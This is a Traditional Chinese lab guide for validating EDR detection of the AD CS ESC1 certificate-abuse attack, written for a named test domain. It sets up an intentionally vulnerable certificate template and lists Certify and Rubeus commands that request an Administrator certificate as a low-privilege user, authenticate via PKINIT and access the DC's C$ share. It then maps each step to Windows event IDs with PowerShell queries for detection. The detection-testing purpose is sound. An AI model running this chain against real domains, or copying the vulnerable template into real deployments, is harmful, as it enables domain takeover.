# AD CS ESC1 漏洞驗證指南

本文件提供 ESC1 (AD CS Certificate Abuse) 的完整驗證流程，包含環境設置、攻擊執行和事件偵測驗證。

## 環境資訊

- **原始環境**: AD CS 主機 (10.0.0.206), CA 名稱: sme-SME-SWP-W-AD-CA
- **新環境**: AD CS 主機 (10.0.1.132), CA 名稱: SME-SWP-CS
- 測試端點: 具備憑證列舉與 PKINIT 測試能力
- 目標: 驗證 EDR 對憑證濫用攻擊鏈的可視性

---

## 重要：啟用稽核日誌 (AD CS 主機端)

若不啟用稽核原則，將無法在 Windows Event Log 中看到關鍵事件。

### 啟用 CA 稽核與系統稽核

```powershell
# 在 AD CS 主機執行
certutil -setreg CA\\AuditFilter 127
Restart-Service CertSvc

auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
```

---

## 第一階段：ESC1 漏洞範本設置 (AD CS 主機端)

### 建立 ESC1 範本
1. certtmpl.msc → Duplicate "User" (Windows Server 2003 Enterprise)
2. General: Template display name = ESC1
3. Request Handling: Allow private key to be exported
4. Subject Name: Supply in the request (ENROLLEE_SUPPLIES_SUBJECT)
5. Extensions → Application Policies: 包含 Client Authentication (1.3.6.1.5.5.7.3.2)
6. Security: 加入 Domain Users，勾 Read/Enroll

### 發佈範本 (關鍵步驟)
```powershell
# 在 CA 伺服器 (10.0.1.132) 上確認範本已發佈
certsrv.msc → Certificate Templates → New → Certificate Template to Issue
# 檢查 ESC1 是否在可用範本清單中
```

---

## 第二階段：攻擊鏈驗證 (測試機端)

**測試機路徑**: `C:\Users\aduser\Desktop\PCT-94727-3\`

### 2.1 確認 CA 名稱
```powershell
# 從任何已加入網域的電腦
certutil -cainfo name
# 預期輸出: CA name: SME-SWP-CS
```

### 2.2 列舉可攻擊範本
```powershell
.\Certify.exe cas
.\Certify.exe enum-templates --ca "10.0.1.132\SME-SWP-CS" --vulnerable
```

### 2.3 請求惡意憑證 (ESC1)
```powershell
.\Certify.exe request --ca "10.0.1.132\SME-SWP-CS" --template "ESC1" --upn "Administrator@sme.local" 
```

### 2.4 PKINIT 認證
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:<[*] base64(ticket.kirbi):

      doIGUjCCBk6gAwIBBaEDAgEWooIFazCCBWdhggVjMIIFX6ADAgEFoQsbCVNNRS5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBs...> /ptt
```

### 2.5 驗證權限提升
```powershell
dir \\10.0.1.132\c$
```

---

## 事件記錄對應表

| 指令 | 預期事件 | 主機位置 | 關鍵偵測點 |
|------|----------|----------|------------|
| `Certify enum-templates` | 4688 | 測試機 | Process Creation |
| `Certify request` | **4886, 4887** | CA | Requester vs Subject 矛盾 |
| `Rubeus asktgt` | **4768** | DC | Certificate Information + PKINIT |
| `dir \\server\c$` | **4624, 5140** | DC | Logon Type 3/9 + 高權限存取 |

### Windows 設計限制
- 4886/4887 的 Attributes 欄位**不會記錄 SAN**
- 要確認 SAN=Administrator@sme.local，必須：
  1. 查 CA 資料庫：certsrv.msc → Issued Certificates → Details
  2. 或解析憑證檔案本身

---

## 錯誤解決方案

### 錯誤 0x80094800: "The request was for a certificate template that is not supported"

**根本原因**: ESC1 範本未在 CA 伺服器上正確發佈

**解決步驟**:
1. 在 CA 伺服器 (10.0.1.132) 上開啟 certsrv.msc
2. 左側樹狀目錄 → Certificate Templates
3. 右鍵 → New → Certificate Template to Issue
4. 檢查 ESC1 是否在可用範本清單中
5. 如果不在清單中，需要重新發佈範本

### 錯誤 0x8007052E: "The user name or password is incorrect"

**解決步驟**:
```powershell
# 檢查網域連線
whoami /all
net user /domain

# 檢查時間同步
w32tm /query /status

# 檢查 Kerberos ticket
klist
```

### 其他常見問題
- 確保時間同步 (最大 5 分鐘偏差)
- 確認網域連線正常
- 檢查範本權限: Domain Users 必須有 Enroll 權限

---

## 快速取證：PowerShell 事件查詢

### 在 CA 主機查詢 4886/4887
```powershell
$start = (Get-Date).AddMinutes(-60)
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4886,4887; StartTime = $start } |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $data = @{}
    foreach ($d in $x.Event.EventData.Data) { $data[$d.Name] = $d.'#text' }
    [pscustomobject]@{
      TimeCreated = $_.TimeCreated
      EventId     = $_.Id
      RequestId   = $data['RequestId']
      Requester   = $data['Requester']
      Subject     = $data['Subject']
    }
  }
```

### 在 DC 主機查詢 4768/4624
```powershell
$start = (Get-Date).AddMinutes(-60)
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768,4624; StartTime = $start } |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $data = @{}
    foreach ($d in $x.Event.EventData.Data) { $data[$d.Name] = $d.'#text' }
    [pscustomobject]@{
      TimeCreated   = $_.TimeCreated
      EventId       = $_.Id
      TargetUser    = $data['TargetUserName']
      LogonType     = $data['LogonType']
    }
  }
```

---

## 驗證要點

1. **核心偵測**: 檢查 4887 的 Requester (低權限) vs Subject (高權限) 的矛盾
2. **時間關聯**: 用 4768 的 Certificate Information + 時間窗，關聯到 4886/4887 的 RequestId
3. **攻擊鏈**: 低權限申請高權憑證 → 用憑證做 PKINIT → 成功存取高權資源

**完成標誌**: 能夠成功存取 `\\10.0.1.132\c$` 並在事件記錄中看到完整的攻擊鏈事件。
